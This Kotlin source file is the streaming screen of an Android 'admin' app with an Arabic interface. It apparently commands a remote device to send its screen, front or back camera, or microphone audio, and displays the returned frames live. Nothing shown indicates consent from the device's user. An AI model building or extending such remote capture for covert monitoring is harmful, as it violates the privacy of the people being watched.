package com.abuzahra.admin.ui.streaming

import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.R
import com.abuzahra.admin.data.api.ApiClient
import com.abuzahra.admin.data.api.ApiService
import com.abuzahra.admin.data.model.Device
import com.abuzahra.admin.databinding.ActivityStreamingBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.snackbar.Snackbar
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class StreamingActivity : AppCompatActivity() {

    private lateinit var binding: ActivityStreamingBinding
    private lateinit var device: Device
    private lateinit var api: ApiService

    // Server expects these exact stream_type values (see api_handlers.py jpeg_loop):
    //   "screen"      → cmd = screenshot
    //   "front_camera" → cmd = front_camera
    //   "back_camera"  → cmd = back_camera
    //   "audio"        → cmd = record_audio
    private var streamType = "screen"
    private var intervalMs = 2000L
    private var isStreaming = false
    private val handler = Handler(Looper.getMainLooper())
    private var streamRunnable: Runnable? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityStreamingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        device = intent.getSerializableExtra(EXTRA_DEVICE) as? Device ?: run {
            finish()
            return
        }

        val prefs = Preferences.getInstance(this)
        api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")

        setupToolbar()
        setupViews()
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "البث المباشر"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        supportActionBar?.subtitle = device.name.ifEmpty { device.model }
        binding.toolbar.setNavigationOnClickListener { stopAndFinish() }
    }

    private fun setupViews() {
        // Stream type selector — 4 chips matching server stream_type values
        binding.chipScreen.isChecked = true
        binding.chipScreen.setOnClickListener {
            streamType = "screen"
            selectStreamChip(binding.chipScreen)
        }
        binding.chipFrontCamera.setOnClickListener {
            streamType = "front_camera"
            selectStreamChip(binding.chipFrontCamera)
        }
        binding.chipBackCamera.setOnClickListener {
            streamType = "back_camera"
            selectStreamChip(binding.chipBackCamera)
        }
        binding.chipAudio.setOnClickListener {
            streamType = "audio"
            selectStreamChip(binding.chipAudio)
        }

        // Quality selector (interval-based)
        binding.chipQualityHigh.setOnClickListener {
            intervalMs = 500L
            selectQualityChip(binding.chipQualityHigh)
        }
        binding.chipQualityMedium.setOnClickListener {
            intervalMs = 1000L
            selectQualityChip(binding.chipQualityMedium)
        }
        binding.chipQualityLow.setOnClickListener {
            intervalMs = 2000L
            selectQualityChip(binding.chipQualityLow)
        }
        binding.chipQualityMedium.isChecked = true

        // Start/Stop
        binding.btnStartStream.setOnClickListener {
            if (!isStreaming) {
                startStreaming()
            }
        }
        binding.btnStopStream.setOnClickListener {
            stopStreaming()
        }
        binding.btnStopStream.isEnabled = false
    }

    private fun selectStreamChip(selected: com.google.android.material.chip.Chip) {
        listOf(binding.chipScreen, binding.chipFrontCamera, binding.chipBackCamera, binding.chipAudio).forEach {
            it.isChecked = (it == selected)
        }
    }

    private fun selectQualityChip(selected: com.google.android.material.chip.Chip) {
        listOf(binding.chipQualityHigh, binding.chipQualityMedium, binding.chipQualityLow).forEach {
            it.isChecked = (it == selected)
        }
    }

    private fun startStreaming() {
        if (!device.isOnline) {
            Snackbar.make(binding.root, "الجهاز غير متصل", Snackbar.LENGTH_LONG).show()
            return
        }

        isStreaming = true
        binding.btnStartStream.isEnabled = false
        binding.btnStopStream.isEnabled = true
        binding.progressBar.visibility = View.VISIBLE
        binding.tvStatus.text = "جاري الاتصال..."

        lifecycleScope.launch {
            try {
                api.startJpegStream(device.id, streamType)

                withContext(Dispatchers.Main) {
                    binding.tvStatus.text = "بث مباشر - ${streamLabel(streamType)}"
                    binding.progressBar.visibility = View.GONE
                    startFramePolling()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    binding.tvStatus.text = "فشل بدء البث"
                    binding.progressBar.visibility = View.GONE
                    isStreaming = false
                    binding.btnStartStream.isEnabled = true
                    binding.btnStopStream.isEnabled = false
                }
            }
        }
    }

    private fun streamLabel(type: String): String = when (type) {
        "screen" -> "بث الشاشة"
        "front_camera" -> "الكاميرا الأمامية"
        "back_camera" -> "الكاميرا الخلفية"
        "audio" -> "بث الصوت"
        else -> type
    }

    private fun startFramePolling() {
        streamRunnable = Runnable {
            if (!isStreaming) return@Runnable

            val currentRunnable = streamRunnable
            lifecycleScope.launch {
                try {
                    // Server stores ALL frames under the key {device_id}:video
                    // (see api_handlers.py:524, 691, 1421, 1450) — always poll with type=video
                    val response = api.getStreamFrame(device.id, "video")

                    if (response.ok && response.data.isNotEmpty()) {
                        val bytes = android.util.Base64.decode(response.data, android.util.Base64.DEFAULT)
                        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        withContext(Dispatchers.Main) {
                            binding.imageView.setImageBitmap(bitmap)
                            binding.tvFrameInfo.text = "${bitmap.width}x${bitmap.height}"
                            binding.tvFrameInfo.visibility = View.VISIBLE
                        }
                    }
                } catch (_: Exception) {}

                if (isStreaming && currentRunnable != null) {
                    handler.postDelayed(currentRunnable, intervalMs)
                }
            }
        }
        handler.post(streamRunnable!!)
    }

    private fun stopStreaming() {
        isStreaming = false
        handler.removeCallbacksAndMessages(null)
        streamRunnable = null

        binding.btnStartStream.isEnabled = true
        binding.btnStopStream.isEnabled = false
        binding.tvStatus.text = "تم إيقاف البث"
        binding.progressBar.visibility = View.GONE

        lifecycleScope.launch {
            try {
                api.stopJpegStream(device.id)
            } catch (_: Exception) {}
        }
    }

    private fun stopAndFinish() {
        stopStreaming()
        finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
    }

    companion object {
        const val EXTRA_DEVICE = "extra_device"

        fun newIntent(context: Context, device: Device): Intent {
            return Intent(context, StreamingActivity::class.java).apply {
                putExtra(EXTRA_DEVICE, device)
            }
        }
    }
}
